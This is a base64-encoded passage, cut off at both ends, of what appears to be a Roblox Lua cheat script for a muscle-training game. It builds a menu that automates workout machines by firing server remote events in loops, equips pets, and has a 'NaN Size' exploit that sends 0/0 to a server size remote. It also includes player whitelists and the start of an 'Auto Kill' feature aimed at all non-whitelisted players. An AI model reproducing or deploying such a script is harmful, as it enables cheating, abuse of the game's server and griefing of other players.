VlCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kKQplbmQKCi0tIEZ1bmN0aW9uIHRvIHN0b3AgdXNpbmcgbWFjaGluZQpsb2NhbCBmdW5jdGlvbiBzdG9wTWFjaGluZSgpCiAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgbG9jYWwgY2hhcmFjdGVyID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgIGlmIGNoYXJhY3RlciB0aGVuCiAgICAgICAgICAgIGNoYXJhY3Rlci5IdW1hbm9pZC5TaXQgPSBmYWxzZQogICAgICAgICAgICBjaGFyYWN0ZXIuSHVtYW5vaWQuSnVtcCA9IHRydWUKICAgICAgICAgICAgY3VycmVudE1hY2hpbmUgPSBuaWwKICAgICAgICAgICAgY3VycmVudE1hY2hpbmVBY3RpdmUgPSBmYWxzZQogICAgICAgIGVuZAogICAgZW5kKQplbmQKCi0tIEZ1bmN0aW9uIHRvIGRvIHJlcHMgb24gY3VycmVudCBtYWNoaW5lCmxvY2FsIGZ1bmN0aW9uIGRvTWFjaGluZVJlcHMoKQogICAgaWYgY3VycmVudE1hY2hpbmVBY3RpdmUgYW5kIGN1cnJlbnRNYWNoaW5lIHRoZW4KICAgICAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgIGxvY2FsIG1hY2hpbmUgPSB3b3Jrc3BhY2UubWFjaGluZXNGb2xkZXI6RmluZEZpcnN0Q2hpbGQoY3VycmVudE1hY2hpbmUpCiAgICAgICAgICAgIGlmIG1hY2hpbmUgYW5kIG1hY2hpbmU6RmluZEZpcnN0Q2hpbGQoImludGVyYWN0U2VhdCIpIHRoZW4KICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKS5yRXZlbnRzLm1hY2hpbmVJbnRlcmFjdFJlbW90ZTpJbnZva2VTZXJ2ZXIoInVzZU1hY2hpbmUiLCBtYWNoaW5lLmludGVyYWN0U2VhdCkKICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLm11c2NsZUV2ZW50OkZpcmVTZXJ2ZXIoInJlcCIsIG1hY2hpbmUuaW50ZXJhY3RTZWF0KQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCiAgICBlbmQKZW5kCgotLSBNYWNoaW5lIFRvZ2dsZSBDcmVhdG9yIEZ1bmN0aW9uCmxvY2FsIGZ1bmN0aW9uIGNyZWF0ZU1hY2hpbmVUb2dnbGUocGFyZW50LCB0aXRsZSwgbWFjaGluZU5hbWUsIHN0YXRlVmFyKQogICAgcGFyZW50OlRvZ2dsZSh7CiAgICAgICAgVGl0bGUgPSB0aXRsZSwKICAgICAgICBEZXNjID0gIkF1dG8gdXNlICIgLi4gbWFjaGluZU5hbWUsCiAgICAgICAgVmFsdWUgPSBmYWxzZSwKICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgICAgICBzdGF0ZVZhciA9IHN0YXRlCiAgICAgICAgICAgIGlmIHN0YXRlIHRoZW4KICAgICAgICAgICAgICAgIHN0b3BNYWNoaW5lKCkKICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjUpCiAgICAgICAgICAgICAgICBzZXR1cE1hY2hpbmUobWFjaGluZU5hbWUpCiAgICAgICAgICAgICAgICB3aGlsZSBzdGF0ZVZhciBhbmQgY3VycmVudE1hY2hpbmUgPT0gbWFjaGluZU5hbWUgZG8KICAgICAgICAgICAgICAgICAgICBkb01hY2hpbmVSZXBzKCkKICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4wMSkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICBpZiBjdXJyZW50TWFjaGluZSA9PSBtYWNoaW5lTmFtZSB0aGVuCiAgICAgICAgICAgICAgICAgICAgc3RvcE1hY2hpbmUoKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgfSkKZW5kCgotLSBUaW55IEd5bSBTZWN0aW9uCkd5bVRhYjpTZWN0aW9uKHtUaXRsZSA9ICLwn4+gIFRpbnkgR3ltIn0pCmxvY2FsIHRpbnlCZW5jaCwgdGlueVNxdWF0LCB0aW55UHVsbHVwcywgdGlueURlYWRsaWZ0ID0gZmFsc2UsIGZhbHNlLCBmYWxzZSwgZmFsc2UKCmNyZWF0ZU1hY2hpbmVUb2dnbGUoR3ltVGFiLCAiQmVuY2ggUHJlc3MiLCAiQmVuY2ggUHJlc3MiLCB0aW55QmVuY2gpCmNyZWF0ZU1hY2hpbmVUb2dnbGUoR3ltVGFiLCAiU3F1YXQgUmFjayIsICJTcXVhdCBSYWNrIiwgdGlueVNxdWF0KQpjcmVhdGVNYWNoaW5lVG9nZ2xlKEd5bVRhYiwgIlB1bGx1cHMiLCAiUHVsbHVwcyIsIHRpbnlQdWxsdXBzKQpjcmVhdGVNYWNoaW5lVG9nZ2xlKEd5bVRhYiwgIkRlYWRsaWZ0IiwgIkRlYWRsaWZ0IiwgdGlueURlYWRsaWZ0KQoKLS0gRnJvc3QgR3ltIFNlY3Rpb24KR3ltVGFiOlNlY3Rpb24oe1RpdGxlID0gIuKdhO+4jyBGcm9zdCBHeW0ifSkKbG9jYWwgZnJvc3RQcmVzcywgZnJvc3RMaWZ0LCBmcm9zdFNxdWF0LCBmcm9zdEJvdWxkZXIgPSBmYWxzZSwgZmFsc2UsIGZhbHNlLCBmYWxzZQoKY3JlYXRlTWFjaGluZVRvZ2dsZShHeW1UYWIsICJGcm9zdCBQcmVzcyIsICJGcm9zdCBQcmVzcyIsIGZyb3N0UHJlc3MpCmNyZWF0ZU1hY2hpbmVUb2dnbGUoR3ltVGFiLCAiRnJvc3QgTGlmdCIsICJGcm9zdCBMaWZ0IiwgZnJvc3RMaWZ0KQpjcmVhdGVNYWNoaW5lVG9nZ2xlKEd5bVRhYiwgIkZyb3N0IFNxdWF0IiwgIkZyb3N0IFNxdWF0IiwgZnJvc3RTcXVhdCkKY3JlYXRlTWFjaGluZVRvZ2dsZShHeW1UYWIsICJCb3VsZGVyIFRocm93IiwgIkJvdWxkZXIgVGhyb3ciLCBmcm9zdEJvdWxkZXIpCgotLSBNeXRoaWNhbCBHeW0gU2VjdGlvbgpHeW1UYWI6U2VjdGlvbih7VGl0bGUgPSAi4pyoIE15dGhpY2FsIEd5bSJ9KQpsb2NhbCBteXRoaWNhbFByZXNzLCBteXRoaWNhbFB1bGx1cCwgbXl0aGljYWxUaHJvdyA9IGZhbHNlLCBmYWxzZSwgZmFsc2UKCmNyZWF0ZU1hY2hpbmVUb2dnbGUoR3ltVGFiLCAiTXl0aGljYWwgUHJlc3MiLCAiTXl0aGljYWwgUHJlc3MiLCBteXRoaWNhbFByZXNzKQpjcmVhdGVNYWNoaW5lVG9nZ2xlKEd5bVRhYiwgIk15dGhpY2FsIFB1bGx1cCIsICJNeXRoaWNhbCBQdWxsdXAiLCBteXRoaWNhbFB1bGx1cCkKY3JlYXRlTWFjaGluZVRvZ2dsZShHeW1UYWIsICJNeXRoaWNhbCBUaHJvdyIsICJNeXRoaWNhbCBUaHJvdyIsIG15dGhpY2FsVGhyb3cpCgotLSBJbmZlcm5vIEd5bSBTZWN0aW9uCkd5bVRhYjpTZWN0aW9uKHtUaXRsZSA9ICLwn5SlIEluZmVybm8gR3ltIn0pCmxvY2FsIGV0ZXJuYWxQcmVzcyA9IGZhbHNlCgpjcmVhdGVNYWNoaW5lVG9nZ2xlKEd5bVRhYiwgIkV0ZXJuYWwgUHJlc3MiLCAiRXRlcm5hbCBQcmVzcyIsIGV0ZXJuYWxQcmVzcykKCi0tIExlZ2VuZHMgR3ltIFNlY3Rpb24KR3ltVGFiOlNlY3Rpb24oe1RpdGxlID0gIvCfjJ8gTGVnZW5kcyBHeW0ifSkKbG9jYWwgbGVnZW5kc1ByZXNzLCBsZWdlbmRzTGlmdCwgbGVnZW5kc1NxdWF0LCBsZWdlbmRzUHVsbHVwLCBsZWdlbmRzVGhyb3cgPSBmYWxzZSwgZmFsc2UsIGZhbHNlLCBmYWxzZSwgZmFsc2UKCmNyZWF0ZU1hY2hpbmVUb2dnbGUoR3ltVGFiLCAiTGVnZW5kcyBQcmVzcyIsICJMZWdlbmRzIFByZXNzIiwgbGVnZW5kc1ByZXNzKQpjcmVhdGVNYWNoaW5lVG9nZ2xlKEd5bVRhYiwgIkxlZ2VuZHMgTGlmdCIsICJMZWdlbmRzIExpZnQiLCBsZWdlbmRzTGlmdCkKY3JlYXRlTWFjaGluZVRvZ2dsZShHeW1UYWIsICJMZWdlbmRzIFNxdWF0IiwgIkxlZ2VuZHMgU3F1YXQiLCBsZWdlbmRzU3F1YXQpCmNyZWF0ZU1hY2hpbmVUb2dnbGUoR3ltVGFiLCAiTGVnZW5kcyBQdWxsdXAiLCAiTGVnZW5kcyBQdWxsdXAiLCBsZWdlbmRzUHVsbHVwKQpjcmVhdGVNYWNoaW5lVG9nZ2xlKEd5bVRhYiwgIkxlZ2VuZHMgVGhyb3ciLCAiTGVnZW5kcyBUaHJvdyIsIGxlZ2VuZHNUaHJvdykKCi0tIE11c2NsZSBLaW5nIEd5bSBTZWN0aW9uCkd5bVRhYjpTZWN0aW9uKHtUaXRsZSA9ICLwn5GRIE11c2NsZSBLaW5nIEd5bSJ9KQpsb2NhbCBraW5nQmVuY2gsIGtpbmdMaWZ0LCBraW5nU3F1YXQsIGtpbmdNb3VudGFpbiwga2luZ0JvdWxkZXIgPSBmYWxzZSwgZmFsc2UsIGZhbHNlLCBmYWxzZSwgZmFsc2UKCmNyZWF0ZU1hY2hpbmVUb2dnbGUoR3ltVGFiLCAiTXVzY2xlIEtpbmcgQmVuY2giLCAiTXVzY2xlIEtpbmcgQmVuY2giLCBraW5nQmVuY2gpCmNyZWF0ZU1hY2hpbmVUb2dnbGUoR3ltVGFiLCAiTXVzY2xlIEtpbmcgTGlmdCIsICJNdXNjbGUgS2luZyBMaWZ0Iiwga2luZ0xpZnQpCmNyZWF0ZU1hY2hpbmVUb2dnbGUoR3ltVGFiLCAiTXVzY2xlIEtpbmcgU3F1YXQiLCAiTXVzY2xlIEtpbmcgU3F1YXQiLCBraW5nU3F1YXQpCmNyZWF0ZU1hY2hpbmVUb2dnbGUoR3ltVGFiLCAiTXVzY2xlIEtpbmcgTW91bnRhaW4iLCAiTXVzY2xlIEtpbmcgTW91bnRhaW4iLCBraW5nTW91bnRhaW4pCmNyZWF0ZU1hY2hpbmVUb2dnbGUoR3ltVGFiLCAiS2luZyBCb3VsZGVyIiwgIktpbmcgQm91bGRlciIsIGtpbmdCb3VsZGVyKQoKLS0gSnVuZ2xlIEd5bSBTZWN0aW9uCkd5bVRhYjpTZWN0aW9uKHtUaXRsZSA9ICLwn4y0IEp1bmdsZSBHeW0ifSkKbG9jYWwganVuZ2xlQmVuY2gsIGp1bmdsZUxpZnQsIGp1bmdsZVNxdWF0LCBqdW5nbGVCb3VsZGVyID0gZmFsc2UsIGZhbHNlLCBmYWxzZSwgZmFsc2UKCmNyZWF0ZU1hY2hpbmVUb2dnbGUoR3ltVGFiLCAiSnVuZ2xlIEJlbmNoIiwgIkp1bmdsZSBCZW5jaCIsIGp1bmdsZUJlbmNoKQpjcmVhdGVNYWNoaW5lVG9nZ2xlKEd5bVRhYiwgIkp1bmdsZSBCYXIgTGlmdCIsICJKdW5nbGUgQmFyIExpZnQiLCBqdW5nbGVMaWZ0KQpjcmVhdGVNYWNoaW5lVG9nZ2xlKEd5bVRhYiwgIkp1bmdsZSBTcXVhdCIsICJKdW5nbGUgU3F1YXQiLCBqdW5nbGVTcXVhdCkKY3JlYXRlTWFjaGluZVRvZ2dsZShHeW1UYWIsICJKdW5nbGUgQm91bGRlciIsICJKdW5nbGUgQm91bGRlciIsIGp1bmdsZUJvdWxkZXIpCgotLSBTdGF0cyBUYWIKbG9jYWwgU3RhdHNUYWIgPSBXaW5kb3c6VGFiKHtUaXRsZSA9ICJTdGF0cyIsIEljb24gPSAiYWN0aXZpdHkifSkKCi0tIFNlc3Npb24gVGltZXIgU2VjdGlvbgpTdGF0c1RhYjpTZWN0aW9uKHtUaXRsZSA9ICJTZXNzaW9uIFRpbWVyIn0pCmxvY2FsIHRpbWVyTGFiZWwgPSBTdGF0c1RhYjpMYWJlbCh7VGl0bGUgPSAi4o+wIFRJTUUiLCBEZXNjID0gIjBzIDBtIDBoIDBkIn0pCgp0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgIGxvY2FsIHN0YXJ0VGltZSA9IHRpY2soKQogICAgCiAgICB3aGlsZSB0YXNrLndhaXQoMSkgZG8KICAgICAgICBsb2NhbCBlbGFwc2VkID0gdGljaygpIC0gc3RhcnRUaW1lCiAgICAgICAgCiAgICAgICAgbG9jYWwgc2Vjb25kcyA9IG1hdGguZmxvb3IoZWxhcHNlZCAlIDYwKQogICAgICAgIGxvY2FsIG1pbnV0ZXMgPSBtYXRoLmZsb29yKChlbGFwc2VkIC8gNjApICUgNjApIAogICAgICAgIGxvY2FsIGhvdXJzID0gbWF0aC5mbG9vcigoZWxhcHNlZCAvIDM2MDApICUgMjQpCiAgICAgICAgbG9jYWwgZGF5cyA9IG1hdGguZmxvb3IoZWxhcHNlZCAvIDg2NDAwKQogICAgICAgIAogICAgICAgIHRpbWVyTGFiZWw6U2V0RGVzYyhzdHJpbmcuZm9ybWF0KCIlZHMgJWRtICVkaCAlZGQiLCBzZWNvbmRzLCBtaW51dGVzLCBob3VycywgZGF5cykpCiAgICBlbmQKZW5kKQoKLS0gU3RhdHMgRGlzcGxheSBTZWN0aW9uClN0YXRzVGFiOlNlY3Rpb24oe1RpdGxlID0gIvCfk4ogU1RBVFMifSkKCi0tIEhlbHBlciBmdW5jdGlvbiB0byBmb3JtYXQgbnVtYmVycwpsb2NhbCBmdW5jdGlvbiBmb3JtYXROdW1iZXIodmFsdWUpCiAgICBsb2NhbCByYXdGb3JtYXR0ZWQgPSB0b3N0cmluZyh2YWx1ZSk6cmV2ZXJzZSgpOmdzdWIoIiVkJWQlZCIsICIlMSwiKTpyZXZlcnNlKCk6Z3N1YigiXiwiLCAiIikKICAgIAogICAgbG9jYWwgYWJicmV2aWF0ZWQgPSAiIgogICAgaWYgdmFsdWUgPj0gMTAwMDAwMDAwMDAwMDAwMDAwMCB0aGVuCiAgICAgICAgYWJicmV2aWF0ZWQgPSBzdHJpbmcuZm9ybWF0KCIlLjFmUWkiLCB2YWx1ZSAvIDEwMDAwMDAwMDAwMDAwMDAwMDApCiAgICBlbHNlaWYgdmFsdWUgPj0gMTAwMDAwMDAwMDAwMDAwMCB0aGVuCiAgICAgICAgYWJicmV2aWF0ZWQgPSBzdHJpbmcuZm9ybWF0KCIlLjFmUWEiLCB2YWx1ZSAvIDEwMDAwMDAwMDAwMDAwMDApCiAgICBlbHNlaWYgdmFsdWUgPj0gMTAwMDAwMDAwMDAwMCB0aGVuCiAgICAgICAgYWJicmV2aWF0ZWQgPSBzdHJpbmcuZm9ybWF0KCIlLjFmVCIsIHZhbHVlIC8gMTAwMDAwMDAwMDAwMCkKICAgIGVsc2VpZiB2YWx1ZSA+PSAxMDAwMDAwMDAwIHRoZW4KICAgICAgICBhYmJyZXZpYXRlZCA9IHN0cmluZy5mb3JtYXQoIiUuMWZCIiwgdmFsdWUgLyAxMDAwMDAwMDAwKQogICAgZWxzZWlmIHZhbHVlID49IDEwMDAwMDAgdGhlbgogICAgICAgIGFiYnJldmlhdGVkID0gc3RyaW5nLmZvcm1hdCgiJS4xZk0iLCB2YWx1ZSAvIDEwMDAwMDApCiAgICBlbHNlaWYgdmFsdWUgPj0gMTAwMCB0aGVuCiAgICAgICAgYWJicmV2aWF0ZWQgPSBzdHJpbmcuZm9ybWF0KCIlLjFmSyIsIHZhbHVlIC8gMTAwMCkKICAgIGVsc2UKICAgICAgICBhYmJyZXZpYXRlZCA9IHRvc3RyaW5nKHZhbHVlKQogICAgZW5kCiAgICAKICAgIHJldHVybiByYXdGb3JtYXR0ZWQsIGFiYnJldmlhdGVkCmVuZAoKLS0gSGVscGVyIGZ1bmN0aW9uIHRvIGNyZWF0ZSBzdGF0IGRpc3BsYXkKbG9jYWwgZnVuY3Rpb24gY3JlYXRlU3RhdERpc3BsYXkoc3RhdE5hbWUsIGVtb2ppLCBzdGF0UGF0aCwgaXNMZWFkZXJzdGF0KQogICAgbG9jYWwgbGFiZWwgPSBTdGF0c1RhYjpMYWJlbCh7VGl0bGUgPSBlbW9qaSAuLiAiICIgLi4gc3RhdE5hbWUsIERlc2MgPSAiMCAoMCkgfCBHQUlORUQ6IDAgKDApIn0pCiAgICBsb2NhbCBzdGFydFZhbHVlID0gaXNMZWFkZXJzdGF0IGFuZCAKICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIubGVhZGVyc3RhdHNbc3RhdFBhdGhdLlZhbHVlIG9yIAogICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcltzdGF0UGF0aF0uVmFsdWUKICAgIAogICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgd2hpbGUgdGFzay53YWl0KDEpIGRvCiAgICAgICAgICAgIGxvY2FsIGN1cnJlbnRWYWx1ZSA9IGlzTGVhZGVyc3RhdCBhbmQgCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIubGVhZGVyc3RhdHNbc3RhdFBhdGhdLlZhbHVlIG9yIAogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyW3N0YXRQYXRoXS5WYWx1ZQogICAgICAgICAgICBsb2NhbCBnYWluZWQgPSBjdXJyZW50VmFsdWUgLSBzdGFydFZhbHVlCiAgICAgICAgICAgIAogICAgICAgICAgICBsb2NhbCBjdXJyZW50UmF3LCBjdXJyZW50QWJiciA9IGZvcm1hdE51bWJlcihjdXJyZW50VmFsdWUpCiAgICAgICAgICAgIGxvY2FsIGdhaW5lZFJhdywgZ2FpbmVkQWJiciA9IGZvcm1hdE51bWJlcihnYWluZWQpCiAgICAgICAgICAgIAogICAgICAgICAgICBsYWJlbDpTZXREZXNjKHN0cmluZy5mb3JtYXQoIiVzICglcykgfCBHQUlORUQ6ICVzICglcykiLCAKICAgICAgICAgICAgICAgIGN1cnJlbnRSYXcsIGN1cnJlbnRBYmJyLCBnYWluZWRSYXcsIGdhaW5lZEFiYnIpKQogICAgICAgIGVuZAogICAgZW5kKQogICAgCiAgICByZXR1cm4gbGFiZWwKZW5kCgotLSBDcmVhdGUgYWxsIHN0YXQgZGlzcGxheXMKY3JlYXRlU3RhdERpc3BsYXkoIlN0cmVuZ3RoIiwgIvCfkqoiLCAiU3RyZW5ndGgiLCB0cnVlKQpjcmVhdGVTdGF0RGlzcGxheSgiRHVyYWJpbGl0eSIsICLwn5uh77iPIiwgIkR1cmFiaWxpdHkiLCBmYWxzZSkKY3JlYXRlU3RhdERpc3BsYXkoIkFnaWxpdHkiLCAi4pqhIiwgIkFnaWxpdHkiLCBmYWxzZSkKY3JlYXRlU3RhdERpc3BsYXkoIlJlYmlydGhzIiwgIvCflIQiLCAiUmViaXJ0aHMiLCB0cnVlKQpjcmVhdGVTdGF0RGlzcGxheSgiQnJhd2xzIiwgIvCfpYoiLCAiQnJhd2xzIiwgdHJ1ZSkKY3JlYXRlU3RhdERpc3BsYXkoIktpbGxzIiwgIvCfkoAiLCAiS2lsbHMiLCB0cnVlKQpjcmVhdGVTdGF0RGlzcGxheSgiR29vZCBLYXJtYSIsICLwn5iHIiwgImdvb2RLYXJtYSIsIGZhbHNlKQpjcmVhdGVTdGF0RGlzcGxheSgiRXZpbCBLYXJtYSIsICLwn5iIIiwgImV2aWxLYXJtYSIsIGZhbHNlKQoKLS0gS2lsbHMgVGFiCmxvY2FsIEtpbGxzVGFiID0gV2luZG93OlRhYih7VGl0bGUgPSAiS2lsbHMiLCBJY29uID0gInRhcmdldCJ9KQoKbG9jYWwgUGxheWVycyA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpCmxvY2FsIExvY2FsUGxheWVyID0gUGxheWVycy5Mb2NhbFBsYXllcgpsb2NhbCBwbGF5ZXJXaGl0ZWxpc3QgPSB7fQpsb2NhbCB0YXJnZXRQbGF5ZXJOYW1lcyA9IHt9CmxvY2FsIGF1dG9LaWxsID0gZmFsc2UKbG9jYWwga2lsbFRhcmdldCA9IGZhbHNlCmxvY2FsIHNweWluZyA9IGZhbHNlCmxvY2FsIGF1dG9QdW5jaE5vQW5pbSA9IGZhbHNlCmxvY2FsIHRhcmdldERyb3Bkb3duSXRlbXMgPSB7fQpsb2NhbCBmcmllbmRXaGl0ZWxpc3RBY3RpdmUgPSBmYWxzZQpsb2NhbCBnb2RNb2RlVG9nZ2xlID0gZmFsc2UKbG9jYWwgZm9sbG93aW5nID0gZmFsc2UKbG9jYWwgZm9sbG93VGFyZ2V0ID0gbmlsCmxvY2FsIGdvZERhbWFnZUFjdGl2ZSA9IGZhbHNlCgotLSBQZXQgU2VsZWN0aW9uIFNlY3Rpb24KS2lsbHNUYWI6U2VjdGlvbih7VGl0bGUgPSAiRXF1aXAgUGV0cyJ9KQoKbG9jYWwgcGV0RHJvcGRvd24gPSBLaWxsc1RhYjpEcm9wZG93bih7CiAgICBUaXRsZSA9ICJTZWxlY3QgUGV0IiwKICAgIExpc3QgPSB7IldpbGQgV2l6YXJkIiwgIk1pZ2h0eSBNb25zdGVyIn0sCiAgICBWYWx1ZSA9ICIiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih0ZXh0KQogICAgICAgIGxvY2FsIHBldHNGb2xkZXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIucGV0c0ZvbGRlcgogICAgICAgIGZvciBfLCBmb2xkZXIgaW4gcGFpcnMocGV0c0ZvbGRlcjpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICBpZiBmb2xkZXI6SXNBKCJGb2xkZXIiKSB0aGVuCiAgICAgICAgICAgICAgICBmb3IgXywgcGV0IGluIHBhaXJzKGZvbGRlcjpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKS5yRXZlbnRzLmVxdWlwUGV0RXZlbnQ6RmlyZVNlcnZlcigidW5lcXVpcFBldCIsIHBldCkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgICAgICB0YXNrLndhaXQoMC4yKQoKICAgICAgICBsb2NhbCBwZXROYW1lID0gdGV4dAogICAgICAgIGxvY2FsIHBldHNUb0VxdWlwID0ge30KCiAgICAgICAgZm9yIF8sIHBldCBpbiBwYWlycyhnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIucGV0c0ZvbGRlci5VbmlxdWU6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgaWYgcGV0Lk5hbWUgPT0gcGV0TmFtZSB0aGVuCiAgICAgICAgICAgICAgICB0YWJsZS5pbnNlcnQocGV0c1RvRXF1aXAsIHBldCkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCgogICAgICAgIGxvY2FsIG1heFBldHMgPSA4CiAgICAgICAgbG9jYWwgZXF1aXBwZWRDb3VudCA9IG1hdGgubWluKCNwZXRzVG9FcXVpcCwgbWF4UGV0cykKCiAgICAgICAgZm9yIGkgPSAxLCBlcXVpcHBlZENvdW50IGRvCiAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKS5yRXZlbnRzLmVxdWlwUGV0RXZlbnQ6RmlyZVNlcnZlcigiZXF1aXBQZXQiLCBwZXRzVG9FcXVpcFtpXSkKICAgICAgICAgICAgdGFzay53YWl0KDAuMSkKICAgICAgICBlbmQKICAgIGVuZAp9KQoKLS0gVXRpbGl0eSBTZWN0aW9uCktpbGxzVGFiOlNlY3Rpb24oe1RpdGxlID0gIlV0aWxpdHkifSkKCktpbGxzVGFiOkJ1dHRvbih7CiAgICBUaXRsZSA9ICJOYU4gU2l6ZSIsCiAgICBEZXNjID0gIlNldCBjaGFyYWN0ZXIgc2l6ZSB0byBOYU4iLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgbG9jYWwgYXJncyA9IHsiY2hhbmdlU2l6ZSIsIDAvMH0KICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIik6V2FpdEZvckNoaWxkKCJyRXZlbnRzIik6V2FpdEZvckNoaWxkKCJjaGFuZ2VTcGVlZFNpemVSZW1vdGUiKTpJbnZva2VTZXJ2ZXIodW5wYWNrKGFyZ3MpKQogICAgZW5kCn0pCgotLSBXaGl0ZWxpc3QgTWFuYWdlbWVudCBTZWN0aW9uCktpbGxzVGFiOlNlY3Rpb24oe1RpdGxlID0gIldoaXRlbGlzdCBNYW5hZ2VtZW50In0pCgpLaWxsc1RhYjpUZXh0Ym94KHsKICAgIFRpdGxlID0gIldoaXRlbGlzdCBQbGF5ZXIiLAogICAgRGVzYyA9ICJBZGQgcGxheWVyIHRvIHdoaXRlbGlzdCIsCiAgICBQbGFjZWhvbGRlciA9ICJQbGF5ZXIgTmFtZSIsCiAgICBWYWx1ZSA9ICIiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih0ZXh0KQogICAgICAgIGxvY2FsIHRhcmdldCA9IFBsYXllcnM6RmluZEZpcnN0Q2hpbGQodGV4dCkKICAgICAgICBpZiB0YXJnZXQgdGhlbgogICAgICAgICAgICBwbGF5ZXJXaGl0ZWxpc3RbdGFyZ2V0Lk5hbWVdID0gdHJ1ZQogICAgICAgIGVuZAogICAgZW5kCn0pCgpLaWxsc1RhYjpUZXh0Ym94KHsKICAgIFRpdGxlID0gIlVuV2hpdGVsaXN0IFBsYXllciIsCiAgICBEZXNjID0gIlJlbW92ZSBwbGF5ZXIgZnJvbSB3aGl0ZWxpc3QiLAogICAgUGxhY2Vob2xkZXIgPSAiUGxheWVyIE5hbWUiLAogICAgVmFsdWUgPSAiIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24odGV4dCkKICAgICAgICBsb2NhbCB0YXJnZXQgPSBQbGF5ZXJzOkZpbmRGaXJzdENoaWxkKHRleHQpCiAgICAgICAgaWYgdGFyZ2V0IHRoZW4KICAgICAgICAgICAgcGxheWVyV2hpdGVsaXN0W3RhcmdldC5OYW1lXSA9IG5pbAogICAgICAgIGVuZAogICAgZW5kCn0pCgpLaWxsc1RhYjpUb2dnbGUoewogICAgVGl0bGUgPSAiQXV0byBXaGl0ZWxpc3QgRnJpZW5kcyIsCiAgICBEZXNjID0gIkF1dG9tYXRpY2FsbHkgd2hpdGVsaXN0IGZyaWVuZHMiLAogICAgVmFsdWUgPSBmYWxzZSwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgZnJpZW5kV2hpdGVsaXN0QWN0aXZlID0gc3RhdGUKCiAgICAgICAgaWYgc3RhdGUgdGhlbgogICAgICAgICAgICBmb3IgXywgcGxheWVyIGluIGlwYWlycyhQbGF5ZXJzOkdldFBsYXllcnMoKSkgZG8KICAgICAgICAgICAgICAgIGlmIHBsYXllciB+PSBMb2NhbFBsYXllciBhbmQgTG9jYWxQbGF5ZXI6SXNGcmllbmRzV2l0aChwbGF5ZXIuVXNlcklkKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgcGxheWVyV2hpdGVsaXN0W3BsYXllci5OYW1lXSA9IHRydWUKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKCiAgICAgICAgICAgIFBsYXllcnMuUGxheWVyQWRkZWQ6Q29ubmVjdChmdW5jdGlvbihwbGF5ZXIpCiAgICAgICAgICAgICAgICBpZiBmcmllbmRXaGl0ZWxpc3RBY3RpdmUgYW5kIHBsYXllciB+PSBMb2NhbFBsYXllciBhbmQgTG9jYWxQbGF5ZXI6SXNGcmllbmRzV2l0aChwbGF5ZXIuVXNlcklkKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgcGxheWVyV2hpdGVsaXN0W3BsYXllci5OYW1lXSA9IHRydWUKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQpCiAgICAgICAgZWxzZQogICAgICAgICAgICBmb3IgbmFtZSBpbiBwYWlycyhwbGF5ZXJXaGl0ZWxpc3QpIGRvCiAgICAgICAgICAgICAgICBsb2NhbCBmcmllbmQgPSBQbGF5ZXJzOkZpbmRGaXJzdENoaWxkKG5hbWUpCiAgICAgICAgICAgICAgICBpZiBmcmllbmQgYW5kIExvY2FsUGxheWVyOklzRnJpZW5kc1dpdGgoZnJpZW5kLlVzZXJJZCkgdGhlbgogICAgICAgICAgICAgICAgICAgIHBsYXllcldoaXRlbGlzdFtuYW1lXSA9IG5pbAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCn0pCgotLSBBdXRvIEtpbGwgU2VjdGlvbgpLaWxsc1RhYjpTZWN0aW9uKHtUaXRsZSA9ICJBdXRvIEtpbGwifSkKCktpbGxzVGFiOlRvZ2dsZSh7CiAgICBUaXRsZSA9ICJBdXRvIEtpbGwiLAogICAgRGVzYyA9ICJBdXRvbWF0aWNhbGx5IGtpbGwgYWxsIG5vbi13aGl0ZWxpc3RlZCBwbGF5ZXJzIiwKICAgIFZhbHVlID0gZmFsc2UsCiAgICB